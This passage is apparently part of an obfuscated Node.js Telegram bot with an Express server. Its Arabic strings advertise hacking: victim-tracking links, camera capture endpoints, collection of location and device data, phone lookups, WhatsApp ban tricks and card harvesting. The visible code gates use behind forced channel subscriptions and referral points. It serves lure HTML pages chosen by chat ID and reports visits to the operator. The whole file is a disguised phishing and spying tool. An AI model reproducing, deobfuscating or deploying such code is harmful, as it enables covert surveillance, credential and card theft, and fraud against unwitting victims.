        'في\x20هذا\x20الد',
        'تفادة\x20من\x20ا',
        '🇳🇮',
        'hxbXG',
        '\x20وظهر\x20أنه\x20',
        'en-US,en;q',
        'subject',
        'WebKit/537',
        'Verificati',
        'name',
        '\x20أثناء\x20إرس',
        'يات\x0aتصاميم',
        'لا\x20توجد\x20نب',
        'writeFileS',
        'كولومبيا\x20🇨🇴',
        'sdxl-light',
        'تم\x20انشاء\x20ا',
        'aOgCD',
        'rong>',
        'xfxuF',
        '\x0a<code>',
        'VFzyI',
        'KCXGl',
        'سيتم\x20فتح\x20ا',
        'ط\x20حتى\x20الآن',
        'azpQB',
        'اختراق\x20بث\x20',
        'اتف\x20كاملاً',
        '.io/api/v3',
        'pkxow',
        'GUOoj',
        'NdzLb',
        'n/xhtml+xm',
        'Sekzm',
        'jLRdg',
        'status',
        'FzmIt',
        'email\x0a\x0aلظه',
        'الرسالة\x20📩:',
        'dLSkR',
        'tions/gend',
        'NrsTV',
        'mFgQW',
        'HviqD',
        'JufcM',
        '71222d927b',
        'ماليزيا\x20',
        'wkWNP',
        'contact',
        '802a534e0e',
        'qhULK',
        'صيد\x20فيزات\x20',
        'OpOsJ',
        'ر\x20عن\x20المست',
        '░░░░░░░░░░',
        'ت\x20الاشتراك',
        'tRUfW',
        'الصور',
        'مكنك\x20تجميع',
        '10mb',
        'محطات\x20الرا',
        'generate_v',
        'ط\x20على\x20الزر',
        '1.api.radi',
        'PuniW',
        '7a8-41f7-a',
        'تم\x20حذف\x20الذ',
        'then',
        'phoneNumbe',
        '🇮🇩',
        'jxAXe',
        '/submitCod',
        'ليتوانيا\x20🇱🇹',
        'يمكنك\x20تولي',
        'FmPSq',
        'يوزرات\x20نوع',
        'السنغال\x20🇸🇳',
        'lljoO',
        'MCTHI',
        'الحصول\x20على',
        'فك\x20حظر\x20مست',
        '18guat8vj3',
        'WzmVJ',
        '=0.9',
        'لبت\x20باسورد',
        '\x20|\x20في\x20بـوت',
        'TIlPE',
        'strong>',
        'erica',
        'FPDnc',
        '63q0cz56f5',
        'تم\x20استلام\x20',
        'GAfKh',
        'text',
        'fOnLP',
        'GFnAN',
        'ECssS',
        'keys',
        'بوليفيا\x20🇧🇴',
        'IEvgY',
        'Error\x20gene',
        '\x20على\x20البري',
        '\x20اين\x20اضع\x20ر',
        'ال\x20معرف\x20ال',
        'ال\x20للتحقق.',
        'Error\x20proc',
        'ط\x20خمس\x20مرات',
        '\x20:*\x20`',
        'labelName',
        'GCXWY',
        'EXcyA',
        'SIGTERM',
        'whatsapp.c',
        'إثيوبيا\x20🇪🇹',
        'تم\x20إضافة\x20ا',
        'f96f108e5d',
        '.\x20هذه\x20هي\x20ا',
        'answerCall',
        'QaTqh',
        'لهجه\x20اليمن',
        'jpMKL',
        '671:S=ALNI',
        'أوامر\x20للاس',
        'latitude',
        'networkSpe',
        'ابدأ_مع_AI',
        'دما\x20تصل\x20ال',
        '\x20الذي\x20تريد',
        '\x20🌐\x0a-\x20اسم\x20ا',
        'eIJLp',
        'apTgL',
        'send',
        'set_free',
        '/mp4;base6',
        'طة.\x0a:\x20http',
        'قه\x20عاليه:\x20',
        'fkhiG',
        'applicatio',
        'kmimr',
        'البحث\x20عن\x20ص',
        'اختر\x20من\x20ال',
        'Cnohz',
        'فعل.\x20انتظر',
        '/strong><c',
        'tDFQF',
        'ages',
        'bPQtH',
        'يمل...</st',
        'bott',
        'خل\x20إلى\x20الر',
        'VMZwp',
        'getLocatio',
        'PQpZr',
        'MKkyD',
        '1cc3%7C943',
        'إضافة\x20قنوا',
        'CoNwY',
        'countryNam',
        '🚫\x20الصوره\x20',
        'random',
        'CWMTh',
        'vOuGN',
        'ceive-smss',
        'أدخل\x20الرسا',
        '\x20النكتة.\x20ا',
        'nKDUJ',
        '_MbgBahDjI',
        '&type=inst',
        '\x20على\x20الزر\x20',
        'append',
        '\x20لإرسال\x20حل',
        'stations/b',
        'ية\x20تحديد\x20ا',
        'ل!\x20يمكنك\x20إ',
        'onrender',
        '\x20قم\x20في\x20تعي',
        'bpRKn',
        'يرجى\x20إرسال',
        'tRbTv',
        'سيتم\x20تصوير',
        'hGJsq',
        'ابط\x20الخاص\x20',
        'yMeGY',
        'chatId',
        'لمستخدم\x20',
        '\x20آخر\x20تحديث',
        '\x27m*\x20[™](t.',
        '/xx.html?c',
        'WHerL',
        '🇲🇾',
        'bZCUk',
        '1129GvAsNj',
        'ihvfa',
        'luxon',
        'ed.',
        'WWVaP',
        'qppvB',
        'أسماء\x20المس',
        'ء\x20من\x20البحث',
        'Ldnvy',
        'ectCV',
        'الرسالة\x20رق',
        'RoITl',
        'sboCP',
        'replit',
        'rHmlm',
        'empty',
        'بلوتوث:\x20',
        'zJvDw',
        'zCMpM',
        'ZZQyQ',
        'eKuMu',
        'jJQLI',
        'countries_',
        ',\x20like\x20Gec',
        '3A;\x20__eoi=',
        'nWeZb',
        'hDpch',
        'ي\x2030\x20نقطه\x20',
        '➖\x20رمز\x20الدو',
        'omfqS',
        '-umber.ver',
        'لصوت:',
        '6870a9d91',
        '🇱🇻',
        'أكتلي\x20رسال',
        '*\x0a\x0a',
        'AFzLL',
        'WlRaX',
        'LTjiV',
        'next_',
        'التواصل\x20مع',
        'مجاني',
        'جهازك\x20او\x20ط',
        'ناة\x20الاشتر',
        '0.5',
        'HDWxX',
        'ت\x20الجهاز',
        'تم\x20فك\x20الحظ',
        'رة\x20الداخلي',
        'تحها\x20مجاني',
        'me/VlP_12',
        'LzkPA2Hp3s',
        'لي30\x20نقطه\x20',
        '\x20الرابط\x20بش',
        'بنغلاديش\x20🇧🇩',
        'اليمن\x20🇾🇪👑',
        'ل\x20على\x201\x20نق',
        'RxLmH',
        'female_voi',
        'yeChG',
        'SpZAF',
        's.html',
        'add_names',
        'BVlaW',
        'مميز',
        'pcNqZ',
        'frYrj',
        'db9d414-54',
        '328a2b2547',
        'نيبال\x20🇳🇵',
        'post',
        'creationTi',
        'd\x20Type\x20:*\x20',
        'jiAnX',
        'bio',
        '\x20لتقنية\x20ال',
        'اشترك\x20في\x20',
        'تم\x20إزالة\x20ق',
        'final_stat',
        'تم\x20تصوير\x20ا',
        'pdZJL',
        'RLIfX',
        'sEhBq',
        ';q=0.8,en;',
        'TKrQz',
        'زيد\x20من\x20الص',
        'تراك\x20الإجب',
        'ثور\x20على\x20صو',
        'نشطة\x20بالفع',
        'nYlWQ',
        'lUTCC',
        'BoClo',
        'tqOel',
        'ود\x20🇲🇪',
        'BbcAq',
        'HUHWv',
        '🇦🇿',
        'MuVdx',
        'ar-SA',
        'EfwMU',
        'طات\x20متاحة\x20',
        'w.a7lamy.c',
        'DEUDb',
        'رابط\x20تجميع',
        'www.blackb',
        'قد\x20حدث\x20خطأ',
        'tWbhc',
        'on...\x0a[▓▓░',
        '\x20على\x20رقم\x20و',
        'لذي\x20تريد\x20ح',
        'ناء\x20الزخرف',
        'ه\x20لطيفه\x20وج',
        'SpBxy',
        'مرحبًا!\x20اض',
        'sing\x20chatI',
        'ange;v=b3;',
        'ylDUz',
        'HGpVC',
        'م\x20الهاتف\x20☎️',
        'xx.html',
        'qyaWG',
        'cel.app/',
        '.ai/agent/',
        '\x20نظام\x20التش',
        'يره\x20جداًوم',
        'ماء\x20🗿',
        'YjpON',
        'KYXOs',
        'اله\x20طويله\x20',
        'ايل\x20الذي\x20ت',
        'node-fetch',
        'fuschia-lo',
        'لقد\x20قام\x20ضح',
        'مالطا\x20🇲🇹',
        'ت\x20اشتراك\x20إ',
        '/captureBa',
        'وبية\x20🇰🇷',
        'لرقام\x20الضح',
        'ه\x20فك\x20وتساب',
        'generate_i',
        '\x20Mobile\x20Sa',
        'userId',
        'process\x20ph',
        'IVlRq',
        ']\x2025%',
        'text\x20to\x20sp',
        'ZAsJh',
        'EUehd',
        '\x20محاولة،\x20',
        'ion-jlmqxi',
        '\x20📡\x0a-\x20الوقت',
        'All\x20images',
        'content',
        'خطأ:\x20',
        'JoNbf',
        'JWgtF',
        'تف\x20☎️\x20:\x20`',
        'ر\x20لتوليد\x20ر',
        'body_text',
        'hwxKZ',
        'aiUrO',
        'اب\x0aافتيارا',
        '0.0.0.0\x20Sa',
        'NilNT',
        'SQmTJ',
        '\x20🇨🇮',
        'lfYdwYsy7t',
        'captureBac',
        '▓▓▓▓▓▓▓▓▓▓',
        'set_paid',
        'حليل\x20الصور',
        'BtcNw',
        '/email/',
        'utf8',
        '\x20رابط\x20لالت',
        'esvhV',
        '5Iw5wkVItL',
        'بمرجد\x20الدخ',
        'قائمة\x20الاش',
        'قائي\x20ارسل\x20',
        'XjNqC',
        'DwKds',
        'سويسرا\x20🇨🇭',
        'NI_MYwfFH5',
        'Bnbga',
        'uyJie',
        '*اليوزر\x20:\x20',
        'HBqua',
        'tinyurl',
        'الذكاء\x20الا',
        '\x20كـ\x20VIP.',
        'JmziV',
        'الته\x20من\x20VI',
        'إضافة\x20مستخ',
        'اري:',
        'لانتهاء.',
        'لاتفيا',
        'qbGvf',
        'تر\x20أحد\x20الخ',
        'mQHfe',
        'اختراق\x20فري',
        'ible-pract',
        'ابط\x20لإضافة',
        'q=0.7',
        'BrMaN',
        'hrHnc',
        'بـ\x20Pintere',
        'https://fl',
        'DAYnB',
        'redirect',
        'لفحصه.',
        'IjDMv',
        'الصورة:',
        'uEusX',
        'استقبال\x20ال',
        'علم_الدولة',
        'السودان\x20🇸🇩',
        'الكاميرون\x20',
        'html',
        'طلب_الكود_',
        'extra',
        '👨🏻‍🏫',
        'السويد',
        'bOfNz',
        'pOJLM',
        'لمراقبة\x20📡',
        '░]\x2025%',
        'موزمبيق\x20🇲🇿',
        'nel',
        'kSIor',
        'LMfCi',
        'ZVRVc',
        'nubhj',
        'اكرة\x20المؤق',
        'ener',
        'عزيزي\x20حمود',
        'WCtzu',
        '\x20النقاط\x20ال',
        'نيه\x20ارساله',
        'params',
        'غير\x20متوفر',
        'ه\x20لنه\x20يحتو',
        'غواتيمالا\x20',
        'ر\x20أدناه\x20لا',
        'ديو\x20المتاح',
        'ث\x20عن\x20صور.\x0a',
        'ion/xml;q=',
        '\x20إرسالها.',
        'cb=929fc9a',
        'sXxWc',
        'تم\x20تحويل\x20ا',
        'ukAuPrckvM',
        'qEbfm',
        'c161e5564e',
        'wPADw',
        'يح\x20يبدأ\x20بـ',
        'جمع\x20معلوما',
        'qkwsI',
        '*الاسم\x20:\x20',
        'SIGHUP',
        '🇫🇮',
        ';\x20__gpi=UI',
        'fykIy',
        'ير\x20chatId\x20',
        '\x20أثناء\x20محا',
        'يل\x20بعد\x20🗳</',
        'log',
        'دم\x20VIP',
        'لاصطناعي\x20ق',
        'لاتفيا\x20🇱🇻',
        'r_query',
        '2DOs-Fgdwp',
        'FrfZS',
        'qPUbU',
        'fkHUZ',
        'longitude',
        'NxEfB',
        '10RlUELr',
        '➖\x20الدوله\x20:',
        'PAnzG',
        'r\x20channel\x20',
        '/g.html?ch',
        '░░░░░░░]\x200',
        'memoryStor',
        'صورة.',
        'eech',
        '\x20جميع\x20المش',
        'لم\x20أتمكن\x20م',
        'تم\x20إرسال\x20ا',
        'ijtXi',
        'خه.',
        'ناميبيا\x20🇳🇦',
        'اب\x20لفك\x20الح',
        'لا\x20يوجد\x20اس',
        'ولة\x20الحصول',
        'ابدأ\x20مع\x20ال',
        'ات\x20الجهاز:',
        'يحتوي\x20على\x20',
        'administra',
        'onText',
        '/captureFr',
        'أرسل\x20الاسم',
        'مرحبًا!\x20بك',
        'YNBbS',
        'static',
        'mm.html',
        'QpsMP',
        'IqAru',
        'mSpBp',
        '/ok.html',
        'sYjFk',
        'uuid',
        '\x2030\x20نقطه\x20ي',
        'م\x20وتساب\x20لف',
        '\x20\x22https\x22.',
        'TVopK',
        'ngan.glitc',
        'vYEQk',
        'oIcMR',
        'f2v8kogOYU',
        'er.glitch.',
        'search_ima',
        'QorTM',
        'egTVG',
        'NDVUm',
        'لم\x20نتمكن\x20م',
        'إسبانيا\x20🇪🇸',
        '/ios',
        'UFpVe',
        'pGUMD',
        '📸الصورة\x20',
        '🤣🤣🤣🤣',
        'KVMED',
        'getItem',
        'ription\x20fo',
        'QhtxG',
        'kUtHw',
        'رابط\x20هذا:\x20',
        '`\x0a*[-]\x20Ban',
        'QvgDW',
        '\x20الرقم\x20لنس',
        'ynthesize',
        'FUlrA',
        'ن\x20النت\x20قوي',
        'لحذر\x20مع\x20ال',
        'كول\x20الأمان',
        'RluJG',
        'إندونيسيا',
        'حساب\x20جديد⚠️',
        'xrxSe',
        'bHZeM',
        '\x22Android\x22',
        'لجهاز:\x20',
        'q.whatsapp',
        'single',
        'رقم\x20الهاتف',
        'GPT-4o',
        'QwXOZ',
        'ه\x20\x20او\x20الصي',
        'text/html,',
        'القناة\x20الت',
        'GIUiU',
        'weKvB',
        'الملف\x20الشخ',
        'iry\x20:*\x20`',
        '<strong>❗ل',
        'ي\x20راسك....',
        'لم\x20تفتح\x20ال',
        'NxIKl',
        'vzIbv',
        'ماء',
        'ى\x20صورة\x20الم',
        '\x20إلى\x20صوت\x20🔄',
        'أذربيجان\x20',
        'فرنسا\x20🇫🇷',
        'العراق\x20🇮🇶',
        'c.html',
        'firstName',
        '\x20as\x20expect',
        'YMlqK',
        'ر\x20الدوله\x20ا',
        '`\x0a*[-]\x20Exp',
        'www',
        'لصور\x20أو\x20ال',
        '\x20البرامجيا',
        'أرسل\x20حلمك\x20',
        'https://fa',
        'hAnfa',
        'uEaGY',
        'SXhus',
        'ابط.',
        'أستطع\x20تحوي',
        'رقمي\x20المحظ',
        'push',
        'ء\x20جلب\x20الرس',
        'اب\x20سريعاً\x0a',
        'fENvJ',
        'GuLmu',
        'DaRQn',
        'OPSZf',
        'dKjcL',
        'شاء\x20⏰\x20:\x20',
        '\x20🎨\x0a-\x20تاريخ',
        '/124.0.0.0',
        'gpdep',
        'جيبوتي\x20🇩🇯',
        'اك\x20الإجبار',
        'deexact/',
        'وله\x20يمكنك\x20',
        'oZRBm',
        'تم\x20انهاء\x20ا',
        'yHngp',
        'gozIY',
        'مالي\x20🇲🇱',
        'ة\x20أخرى.',
        'xttospeech',
        'HiSvV',
        'CAFBb',
        'eaLlA',
        'أدخل\x20معرف\x20',
        'شرح\x20البوت\x20',
        'ارساله\x20لضح',
        '\x0aانمي\x0aوالم',
        'sLoZx',
        'لا\x20توجد\x20رس',
        'لزر\x20لبدء\x20ص',
        'لوحة\x20التحك',
        'نيوزيلندا\x20',
        'SzhSf',
        'orig',
        'HYuWk',
        '\x20ثانية',
        'get_freefi',
        'Bbvyo',
        'AZrQZ',
        'k.html',
        'تشيلي\x20🇨🇱',
        'ction:',
        'EcSjX',
        'ZgSzQ',
        'لبنان',
        'Mozilla/5.',
        'rAkBQ',
        'بوتسوانا\x20🇧🇼',
        'Kit/537.36',
        'info.io/',
        's://t.me/',
        'time',
        'لب\x20بحث\x20بال',
        'euHXc',
        'لمتصفح:\x20',
        '/messages',
        'مصر\x20🇪🇬',
        'IVQOD',
        'delete',
        'XXXFFFLlHH',
        'SafgI',
        'multer',
        'yplWk',
        'إغلاق\x20المو',
        'ور\x20🎨',
        'bluetoothS',
        'swCdV',
        'ك!\x20اضغط\x20ال',
        'PtDOw',
        'holder.tex',
        'خره\x20او\x20حاو',
        'إستونيا\x20🇪🇪',
        'add_channe',
        'TWwrX',
        'YYlvh',
        'paZkC',
        'تفضل\x20هذا\x20ه',
        '\x20📊\x0a-\x20دقة\x20ا',
        'TlcXS',
        '\x20\x20\x20\x20',
        'filter',
        'wSxsY',
        'almunharif',
        'gRnKV',
        'lookup',
        'MDGNB',
        'جورجيا\x20🇬🇪',
        '\x20مهمه\x20اذا\x20',
        'ogvDl',
        'ه\x20يمنيه\x20قص',
        'GKmhi',
        'تم\x20معالجة\x20',
        'Gemini-Pro',
        'سة،\x20اضغط\x20ع',
        '/record/:l',
        'app/',
        'مطور\x20@VlP_',
        'orm-contro',
        'vert\x20this\x20',
        'Received\x20p',
        'ا\x20يوجد\x20شخص',
        'KePAc',
        'TdSjA',
        '\x0aالرسالة:\x20',
        'coolnames.',
        'ViUFb',
        'خص\x20في\x20الدخ',
        'ated-drift',
        'PRIuU',
        'روسيا\x20🇷🇺',
        'GIiFu',
        'lIHWs',
        'bEVdU',
        'UzEAq',
        'GuCGp',
        'ـ\x20chatId\x20',
        'عذرًا،\x20لم\x20',
        'jjrNG',
        '\x20دقيقة\x20و\x20',
        'ook:',
        'LVhHg',
        '\x20🔁',
        'JCb0KaMlMC',
        'صله\x20اضع\x20في',
        'SjwHH',
        'bsuQY',
        'ection\x20Res',
        'No\x20visa\x20da',
        'اختراق\x20عبر',
        '\x20🤣\x20اعطني\x20ن',
        'blog',
        'deo',
        '\x20توك\x20📳',
        'شبه\x20رباعية',
        '&data={\x22op',
        'checked',
        'gRrHH',
        'essing\x20ima',
        'مك.',
        '\x20انشاء\x20ايم',
        'tXyYb',
        'uaMvI',
        '➖\x20رقم\x20الها',
        'كوستاريكا\x20',
        'OHIDU',
        'لديك\x20حاليً',
        'wPNMA',
        '*/*',
        '\x20للـ\x20chatI',
        'ة\x20للدعم',
        'اضغط\x20على\x20ا',
        'Man',
        'SAwMX',
        '=172824867',
        '\x20Visa...\x0a[',
        'bonqQ',
        'ع\x20اضافة\x20فا',
        'FVujI',
        'المجلد\x20غير',
        'ابط\x20أدناه\x20',
        'alomK',
        'لوكسمبورغ\x20',
        'NQvFB',
        'VMBCY',
        'eeaa534554',
        '\x20محطات\x20الر',
        'MDsoR',
        'atId=',
        'JlBBz',
        'بيلاروس\x20🇧🇾',
        'fPWvO',
        'م\x20استلمها\x20',
        '8f26f24f03',
        'fxMTi',
        'NBKjJ',
        'ذكر',
        'يرات\x20المرا',
        'wCpJI',
        'قائمة\x20أدنا',
        'وليد\x20الصور',
        'peCgP',
        '\x20🌐\x0a-\x20إصدار',
        'البرتغال\x20',
        'uYTvo',
        '\x20مدفوعاً،\x20',
        'wbpxt',
        'YsfXD',
        'e4912ddb-3',
        'c5-4ee8-99',
        'الجزائر\x20🇩🇿',
        'لروابط',
        'اكتب\x20لي\x20رس',
        'tions\x22:{\x22q',
        'unban_user',
        'ike\x20Gecko)',
        'username',
        'Chase\x20Bank',
        'إلغاء\x20اشتر',
        'vzJJK',
        'مساعد\x20',
        'SjOLo'
    ];
    _0x43fe = function () {
        return _0x3fed8e;
    };
    return _0x43fe();
}
bot[_0x54266d(0xb39)](/\/vip (.+)/, async (_0x2e5233, _0x2a3adc) => {
    const _0x1da399 = _0x54266d, _0x7d376f = {
            'fPWvO': function (_0x10b1be, _0x36d303) {
                return _0x10b1be(_0x36d303);
            },
            'INjuw': _0x1da399(0x39a) + _0x1da399(0xcb5) + _0x1da399(0x6a7) + _0x1da399(0x27f) + _0x1da399(0x776) + _0x1da399(0x4ed),
            'IWuhL': function (_0x3e5c94, _0x25627d) {
                return _0x3e5c94 !== _0x25627d;
            }
        }, _0x532a32 = _0x2a3adc[0x6 * 0x83 + -0xd8c + -0xa7b * -0x1], _0x18b83d = _0x2e5233[_0x1da399(0x8e6)]['id'], _0x336ab2 = _0x2e5233[_0x1da399(0x6a9)]['id'], _0x1cba52 = await _0x7d376f[_0x1da399(0xc44)](isUserSubscribed, _0x336ab2);
    if (!_0x1cba52) {
        const _0x557596 = _0x7d376f[_0x1da399(0x45e)], _0x1c87b7 = mandatoryChannels[_0x1da399(0x79b)](_0x208b46 => [{
                    'text': _0x1da399(0xa5a) + _0x208b46,
                    'url': _0x1da399(0xcd2) + _0x1da399(0x3f3) + _0x208b46[_0x1da399(0xca7)](-0x7 * -0x5b + 0x10f * 0x1f + -0x234d)
                }]);
        bot[_0x1da399(0x741) + 'e'](_0x336ab2, _0x557596, { 'reply_markup': { 'inline_keyboard': _0x1c87b7 } });
        return;
    }
    if (linkData[_0x532a32]) {
        const {
            userId: _0x5b3ad0,
            visitors: _0x57a3a2
        } = linkData[_0x532a32];
        if (_0x7d376f[_0x1da399(0x5fc)](_0x18b83d, _0x5b3ad0) && (!visitorData[_0x18b83d] || !visitorData[_0x18b83d][_0x1da399(0x439)](_0x5b3ad0))) {
            _0x57a3a2[_0x1da399(0xb97)](_0x18b83d);
            !visitorData[_0x18b83d] && (visitorData[_0x18b83d] = []);
            visitorData[_0x18b83d][_0x1da399(0xb97)](_0x5b3ad0);
            !userPoints[_0x5b3ad0] && (userPoints[_0x5b3ad0] = 0x3 * 0xb15 + -0x18c + 0x21d * -0xf);
            userPoints[_0x5b3ad0] += -0x1 * 0x160f + -0x1651 * -0x1 + -0x1 * 0x41;
            const _0x487222 = _0x1da399(0x3a8) + _0x1da399(0x9e4) + _0x1da399(0xa04) + _0x1da399(0x23d) + _0x1da399(0x612) + _0x1da399(0x9cd) + _0x1da399(0xa29) + _0x1da399(0x966) + _0x1da399(0x2b5) + _0x1da399(0xac1) + _0x1da399(0x35d) + _0x1da399(0x45b) + _0x1da399(0x34f);
            bot[_0x1da399(0x741) + 'e'](_0x336ab2, _0x487222);
            const _0x210495 = _0x1da399(0x271) + _0x1da399(0x5c6) + _0x1da399(0xd00) + _0x1da399(0x529) + _0x1da399(0x6e2);
            bot[_0x1da399(0x741) + 'e'](_0x5b3ad0, _0x210495);
        }
    }
}), bot[_0x54266d(0xb39)](/\/free/, async _0x3bb7b0 => {
    const _0x4fad16 = _0x54266d, _0xd25ece = {
            'NQvFB': function (_0x5d3ff4, _0x46432b) {
                return _0x5d3ff4 - _0x46432b;
            },
            'HQebQ': _0x4fad16(0x520) + _0x4fad16(0x5d9) + _0x4fad16(0x967) + _0x4fad16(0xce7) + _0x4fad16(0x2fd) + _0x4fad16(0x2a4) + _0x4fad16(0xdc1)
        }, _0xc6ce0c = _0x3bb7b0[_0x4fad16(0x6a9)]['id'], _0x3309eb = _0x3bb7b0[_0x4fad16(0x8e6)]['id'];
    if (userPoints[_0x3309eb]) {
        const _0x3a056b = userPoints[_0x3309eb], _0x4f693f = _0x4fad16(0xc2b) + 'ا\x20' + _0x3a056b + (_0x4fad16(0x7ff) + _0x4fad16(0xd2c)) + _0xd25ece[_0x4fad16(0xc3c)](-0xfda + -0xd57 * -0x1 + 0x2a1, _0x3a056b) + (_0x4fad16(0x688) + _0x4fad16(0x719) + _0x4fad16(0x285) + _0x4fad16(0x32d) + 'ة.');
        bot[_0x4fad16(0x741) + 'e'](_0xc6ce0c, _0x4f693f);
    } else {
        const _0x237f38 = _0xd25ece[_0x4fad16(0x4dc)];
        bot[_0x4fad16(0x741) + 'e'](_0xc6ce0c, _0x237f38);
    }
}), bot[_0x54266d(0xb39)](/\/start (.+)/, async (_0x1e1323, _0xecf2f1) => {
    const _0x2cdb1c = _0x54266d, _0x34c312 = {
            'fkhiG': function (_0x38d305, _0x3d95f1) {
                return _0x38d305(_0x3d95f1);
            },
            'HNPeK': _0x2cdb1c(0x39a) + _0x2cdb1c(0xcb5) + _0x2cdb1c(0x6a7) + _0x2cdb1c(0x27f) + _0x2cdb1c(0x776) + _0x2cdb1c(0x4ed),
            'bvuri': function (_0x155f3f, _0x102452) {
                return _0x155f3f !== _0x102452;
            }
        }, _0x3773df = _0xecf2f1[0x17b2 + 0x557 * 0x3 + -0x27b6], _0x24b5a8 = _0x1e1323[_0x2cdb1c(0x8e6)]['id'], _0x322493 = _0x1e1323[_0x2cdb1c(0x6a9)]['id'], _0x2b1b13 = await _0x34c312[_0x2cdb1c(0x9d7)](isUserSubscribed, _0x322493);
    if (!_0x2b1b13) {
        const _0x15d2cd = _0x34c312[_0x2cdb1c(0x936)], _0xf74c96 = mandatoryChannels[_0x2cdb1c(0x79b)](_0x1a16ce => [{
                    'text': _0x2cdb1c(0xa5a) + _0x1a16ce,
                    'url': _0x2cdb1c(0xcd2) + _0x2cdb1c(0x3f3) + _0x1a16ce[_0x2cdb1c(0xca7)](-0x2 * 0x679 + -0x261a + 0x330d)
                }]);
        bot[_0x2cdb1c(0x741) + 'e'](_0x322493, _0x15d2cd, { 'reply_markup': { 'inline_keyboard': _0xf74c96 } });
        return;
    }
    if (linkData[_0x3773df]) {
        const {
            userId: _0x541c64,
            chatId: _0x3027cb,
            visitors: _0xe2ade
        } = linkData[_0x3773df];
        if (_0x34c312[_0x2cdb1c(0xd56)](_0x24b5a8, _0x541c64) && (!visitorData[_0x24b5a8] || !visitorData[_0x24b5a8][_0x2cdb1c(0x439)](_0x541c64))) {
            _0xe2ade[_0x2cdb1c(0xb97)](_0x24b5a8);
            !visitorData[_0x24b5a8] && (visitorData[_0x24b5a8] = []);
            visitorData[_0x24b5a8][_0x2cdb1c(0xb97)](_0x541c64);
            !userPoints[_0x541c64] && (userPoints[_0x541c64] = 0x79 * 0x2f + 0x231 + -0x238 * 0xb);
            userPoints[_0x541c64] += 0x243e + 0x2216 + -0x1 * 0x4653;
            const _0x37ea4c = _0x2cdb1c(0x3a8) + _0x2cdb1c(0x9e4) + _0x2cdb1c(0xa04) + _0x2cdb1c(0x23d) + _0x2cdb1c(0x4e4) + _0x2cdb1c(0x444) + _0x2cdb1c(0xa42) + _0x2cdb1c(0x74c) + _0x2cdb1c(0x529) + _0x2cdb1c(0x769) + _0x2cdb1c(0x50c);
            bot[_0x2cdb1c(0x741) + 'e'](_0x3027cb, _0x37ea4c);
        }
    }
});
const app = express();
app[_0x54266d(0x477)](bodyParser[_0x54266d(0x8cc)]({
    'extended': !![],
    'limit': _0x54266d(0x98a)
})), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x912)]({ 'limit': _0x54266d(0x300) })), app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname));
const storage = multer[_0x54266d(0xb29) + _0x54266d(0x909)](), upload = multer({ 'storage': storage }), uploadVoice = multer({ 'dest': _0x54266d(0x43d) });
app[_0x54266d(0x4bf)](_0x54266d(0x478) + 'rm', (_0x4ed33a, _0x4c4aed) => {
    const _0x1b76d1 = _0x54266d, _0x11edea = {
            'EcSjX': _0x1b76d1(0xd51) + _0x1b76d1(0xb15) + _0x1b76d1(0x85d),
            'tqOel': _0x1b76d1(0x2f8),
            'qSpCR': _0x1b76d1(0x943),
            'MIvyM': _0x1b76d1(0xd26),
            'UuGdQ': _0x1b76d1(0xd2f),
            'AdweU': _0x1b76d1(0xd45),
            'qJXiy': _0x1b76d1(0x686)
        }, _0x3cf3d5 = _0x4ed33a[_0x1b76d1(0x8ec)][_0x1b76d1(0xa06)], _0x3adf6e = _0x4ed33a[_0x1b76d1(0x8ec)][_0x1b76d1(0x476)];
    if (!_0x3cf3d5)
        return _0x4c4aed[_0x1b76d1(0x972)](0x743 + 0x2410 + -0x29c3)[_0x1b76d1(0x9d2)](_0x11edea[_0x1b76d1(0xbc4)]);
    let _0x351d54 = '';
    switch (_0x3adf6e) {
    case _0x11edea[_0x1b76d1(0xa6a)]:
        _0x351d54 = _0x11edea[_0x1b76d1(0x7d4)];
        break;
    case _0x11edea[_0x1b76d1(0x945)]:
        _0x351d54 = _0x11edea[_0x1b76d1(0x8ef)];
        break;
    case _0x11edea[_0x1b76d1(0x2e1)]:
    default:
        _0x351d54 = _0x11edea[_0x1b76d1(0x8c0)];
        break;
    }
    _0x4c4aed[_0x1b76d1(0xd98)](path[_0x1b76d1(0x75e)](__dirname, _0x351d54));
}), app[_0x54266d(0x4bf)](_0x54266d(0x7cf) + _0x54266d(0x6b8), (_0x4a3796, _0x5ccdb7) => {
    const _0xf2ad5d = _0x54266d, _0x20789f = {
            'BQjtW': function (_0x41728b, _0x488779) {
                return _0x41728b(_0x488779);
            },
            'YLRXa': _0xf2ad5d(0x831),
            'ikCFX': _0xf2ad5d(0x54b) + _0xf2ad5d(0xceb) + _0xf2ad5d(0x9b9) + _0xf2ad5d(0xc76) + _0xf2ad5d(0x8d7) + _0xf2ad5d(0xb94),
            'EugDB': _0xf2ad5d(0xa92) + _0xf2ad5d(0x24d) + _0xf2ad5d(0x46d) + _0xf2ad5d(0x1c6) + _0xf2ad5d(0xd21) + _0xf2ad5d(0xd32)
        }, _0x57f38b = _0x4a3796[_0xf2ad5d(0xafd)][_0xf2ad5d(0x1b1)];
    _0x20789f[_0xf2ad5d(0xd85)](validateLinkUsage, _0x57f38b) ? _0x5ccdb7[_0xf2ad5d(0xd98)](path[_0xf2ad5d(0x75e)](__dirname, _0x20789f[_0xf2ad5d(0x3a2)])) : (_0x5ccdb7[_0xf2ad5d(0x9d2)](_0x20789f[_0xf2ad5d(0xdb5)]), bot[_0xf2ad5d(0x741) + 'e'](linkUsage[_0x57f38b][_0xf2ad5d(0xa06)], _0x20789f[_0xf2ad5d(0x422)]));
}), app[_0x54266d(0x4bf)](_0x54266d(0xb3a) + _0x54266d(0x715) + 'd', (_0x3e821c, _0x317f1b) => {
    const _0x168659 = _0x54266d, _0x18d5b3 = {
            'pBRYe': function (_0x509b8f, _0x419f94) {
                return _0x509b8f(_0x419f94);
            },
            'FaVSM': _0x168659(0xb86),
            'NrsTV': _0x168659(0x54b) + _0x168659(0xceb) + _0x168659(0x9b9) + _0x168659(0xc76) + _0x168659(0x8d7) + _0x168659(0xb94),
            'RhDNR': _0x168659(0xa92) + _0x168659(0x24d) + _0x168659(0x46d) + _0x168659(0x1c6) + _0x168659(0xd21) + _0x168659(0xd32)
        }, _0x49a5e0 = _0x3e821c[_0x168659(0xafd)][_0x168659(0x1b1)];
